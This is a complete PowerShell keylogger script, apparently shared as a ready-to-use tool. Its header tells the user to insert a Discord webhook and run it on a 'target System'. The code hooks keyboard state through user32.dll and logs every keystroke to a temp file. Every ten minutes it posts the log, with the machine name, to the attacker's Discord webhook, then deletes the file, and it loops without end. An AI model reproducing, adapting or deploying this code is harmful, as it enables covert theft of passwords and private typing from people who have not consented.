

<#
============================================= Beigeworm's Keylogger Script ========================================================

SYNOPSIS
This script gathers Keypress information and posts to a discord webhook address with the results every 10 minutes.

USAGE
1. Input your credentials below
2. Run Script on target System
3. Check Discord for results

#>

#===================== INPUT CREDENTIALS HERE =====================

$RunTimeP = 10 # Interval (in minutes) between each email
$whuri = "DISCORD_WEBHOOK_HERE"

#==================================================================

Do{
$apip = 1
Start-Sleep 4
$ttrun = 1
$tstrt = Get-Date
$tend = $tstrt.addminutes($RunTimeP)
function Start-Logs($Path = "$env:temp\chars.txt") {$sigs = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$API = Add-Type -MemberDefinition $sigs -Name 'Win32' -Namespace API -PassThru  
$null = New-Item -Path $Path -ItemType File -Force
try{
    Start-Sleep 1
    $run = 0
	while ($ttrun  -ge $run) {                              
	while ($tend -ge $tnow) {
      Start-Sleep -Milliseconds 30
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)
        if ($state -eq -32767){
        $null = [console]::CapsLock
        $virtualKey = $API::MapVirtualKey($ascii, 3)
        $kbstate = New-Object Byte[] 256
        $checkkbstate = $API::GetKeyboardState($kbstate)
        $mychar = New-Object -TypeName System.Text.StringBuilder
        $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
            if ($success) {[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)}}}$tnow = Get-Date}
        $msg = Get-Content -Path $Path -Raw 
        $escmsg = $msg -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
        $json = @{"username" = "$env:COMPUTERNAME" 
                    "content" = $escmsg} | ConvertTo-Json
        Start-Sleep 1
        Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $json
        Start-Sleep 1
        Remove-Item -Path $Path -force
        }
        }
finally{}
}
Start-Logs
}While ($apip -le 5)
